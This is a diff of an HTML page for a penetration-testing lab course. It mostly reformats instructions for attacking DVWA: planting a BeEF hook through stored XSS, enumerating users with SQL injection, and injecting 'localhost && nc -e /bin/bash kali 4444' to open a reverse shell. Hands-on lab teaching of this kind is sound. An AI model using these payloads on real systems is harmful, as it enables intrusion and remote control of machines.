@@ -247,7 +247,7 @@ Set Firefox to use BurpSuite as a proxy and disable captive portal detection
 
 <hr>
 <h3>Task 3</h3>
-Log in as smithy / password
+Log in as <em><b>smithy</b></em> / <em><b>password</b></em>
 
 <hr>
 <h3>Task 4</h3>
@@ -302,7 +302,7 @@ service beef-xss start
 </ul>
 
 <h3>Task 2</h3>
-Navigate to XSS Stored. Figure out a way to insert a BeEF Hook:
+Navigate to XSS Stored. Figure out a way to insert a BeEF Hook.  You can paste in your web browser using <b>[Control+V]</b>:
 
 <!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
 <div class="topbar">
@@ -324,9 +324,7 @@ Navigate to XSS Stored. Figure out a way to insert a BeEF Hook:
 <h3>Task 3</h3>
 <p>Open your Windows desktop and use Firefox to go to DVWA, log in as&nbsp;admin&nbsp;/&nbsp;password</p>
 <ul>
-<li>
-<p>Go to&nbsp;XSS Stored</p>
-</li>
+<li>Go to XSS Stored</li>
 <li>From the BeEF UI, see if the Windows browser is hooked. If not, figure out why not</li>
 </ul>
 
@@ -347,21 +345,15 @@ Navigate to XSS Stored. Figure out a way to insert a BeEF Hook:
 <h3>Task 5</h3>
 <p>To keep BeEF from interfering with later labs, release all hooked browsers</p>
 <ul>
-<li>
-<p>Reset the DVWA RDMS Database from&nbsp;Setup</p>
-</li>
-<li>
-<p>Log back in as&nbsp;admin</p>
-</li>
-<li>
-<p>Close the Remote Desktop for&nbsp;<tt>windows</tt></p>
-</li>
+<li>Reset the DVWA RDMS Database from Setup</li>
+<li>Log back in as admin</li>
+<li>Close the Remote Desktop for <tt>windows</tt></li>
 </ul>
 
 <hr>
 <h2>Exercise 3 : SQL Injection</h2>
 <h3>Task 1</h3>
-<p>Navigate to<strong>SQL Injection</strong>. Enumerate users on the system with an SQL injection.</p>
+<p>Navigate to <strong>SQL Injection</strong>. Enumerate users on the system with an SQL injection.</p>
 
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
@@ -426,9 +418,7 @@ sqlmap --cookie="&lt;cookie&gt;" --url="http://metasploitable/dvwa/vulnerabiliti
 <p>Navigate to&nbsp;<strong>Command Execution</strong>. Inject the command&nbsp;<tt>id</tt></p>
 <ul>
 <li>Use the source Luke!</li>
-<li>
-<p><strong>nano-Hint</strong>: If ping returns an error, you won't see anything</p>
-</li>
+<li><strong>nano-Hint</strong>: If ping returns an error, you won't see anything.</li>
 <li>What user is PHP running as?</li>
 </ul>
 
@@ -457,7 +447,7 @@ nc -v -l -p 4444
 <hr>
 <h3>Task 2b</h3>
 
-<p>Inject this command:<tt>localhost&nbsp;&amp;&amp;&nbsp;nc&nbsp;-e&nbsp;/bin/bash&nbsp;kali&nbsp;4444</tt></p>
+<p>Inject this command: <tt>localhost&nbsp;&amp;&amp;&nbsp;nc&nbsp;-e&nbsp;/bin/bash&nbsp;kali&nbsp;4444</tt></p>
 <ul>
 <li>This will start netcat on the remote host and connect back to you with a shell</li>
 <li>It's normal not to have a prompt -- type commands as you normally would anyway</li>
@@ -472,9 +462,7 @@ What is the uptime of the system?
 <h3>Task 1</h3>
 <p><strong>Shut down BurpSuite</strong>. It uses port 8080 which will conflict with JBoss</p>
 <ul>
-<li>
-<p>You may also need to reboot.&nbsp;<tt>reboot</tt></p>
-</li>
+<li>You may also need to reboot:&nbsp;<tt>reboot</tt></li>
 </ul>
 
 <hr>
@@ -613,9 +601,6 @@ Use <tt>help</tt>
 </li>
 <li>What other commands look interesting? Try some of them out!</li>
 </ul>
-
-
-
 
 <div class="nextsection">
     <div style="float:left; font-size: .9em;">
